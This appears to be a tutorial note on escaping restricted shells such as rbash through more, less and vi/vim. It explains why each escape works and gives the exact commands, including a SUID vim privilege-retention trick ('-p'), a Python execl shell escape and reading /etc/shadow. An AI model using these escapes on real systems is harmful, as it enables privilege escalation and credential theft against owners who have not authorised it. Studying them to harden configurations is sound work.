## 1. The Core Concept: Misconfigured Boundaries
System administrators sometimes attempt to restrict user access by assigning custom scripts or restricted shells (such as **`rbash`**) instead of standard **`/bin/bash`**.

- **The Goal:** Restrict the user to executing specific tools or viewing specific files.  

- **The Flaw:** Relying on interactive utilities (**`more`**, **`less`**, **`man`**, **`vi`**/**`vim`**) that feature built-in command execution and subshell spawning, leading to restricted shell escapes.    

## 2. Exploiting Pagers (`more` / `less`)
Pagers display text sequentially. Interactive features enable escaping the restricted viewing environment:

- **Terminal Height Manipulation:** If file output fits on a single screen, pagers exit automatically. Reducing the terminal window height forces the pager to pause (`--More--`), establishing an interactive prompt.

- **Launching `vi` (`v`):** Pressing **`v`** inside **`more`** or **`less`** opens the current file buffer inside **`vi`**, bypassing view-only restrictions.

- **Direct Command Execution (`!command`):** Executing **`!bash`** or **`!sh`** at the prompt spawns a subshell directly from the pager.

## 3. Weaponizing Text Editors (`vi` / `vim`)
Entering **`vi`** or **`vim`** provides access to internal execution mechanisms, file I/O operations, and embedded language interpreters.
### Command Execution Mechanics (`:!` vs `:set shell`)

- **Why `:!/bin/bash` Fails in `rbash`:** Running **`:!/bin/bash`** passes the command string back to Vim's parent shell (**`rbash`**). **`rbash`** evaluates the path, detects the forward slash (**`/`**), and blocks execution:

```
rbash: /bin/bash: restricted: cannot specify '/' in command names
```
 
- **Why `:set shell=/bin/bash` + `:shell` Succeeds:**
    1. Modifying Vim's internal option via **`:set shell=/bin/bash`** alters a variable within Vim's memory space, bypassing **`rbash`** command parsing entirely.
    2. Running **`:shell`** (or **`:sh`**) causes Vim to suspend itself and invoke the **`execve()`** system call directly on the target binary path, spawning an unrestricted shell without involving **`rbash`**.

### SUID Privilege Retention (`-p`)
When interacting with a SUID **`vim`** binary owned by **`root`**:

- Modern **`bash`** drops effective root privileges (**`EUID`**) if the Real User ID (**`RUID`**) does not match.

- Pass the **`-p`** (privileged) flag inside Vim's shell variable to prevent privilege dropping:

```
" Set the internal shell path and pass the privilege retention flag
:set shell=/bin/bash\ -p

" Spawn the interactive shell process
:shell
``` 
### File Operations
- **Reading Restricted Files (`:r`):** Executing **`:r /path/to/file`** imports external file contents into the active buffer (e.g., **`:r /etc/shadow`**).

- **Writing Files (`:w`):** Save active buffers to create or overwrite system files if write permissions allow.

### Alternative Escape Vectors
- **Python Engine Execution (`:py3`):** If Vim is compiled with Python support (`+python3`), use system calls directly to replace the Vim process with an unrestricted shell:  

```
" Replaces the current Vim process in memory with bash
:py3 import os; os.execl("/bin/bash", "bash", "-p")
```    

- **Embedded Terminal Emulator (`:term`):** If compiled with terminal support (`+terminal`), open an interactive terminal buffer:

```
" Opens an embedded terminal running an unrestricted bash binary
:term /bin/bash
```
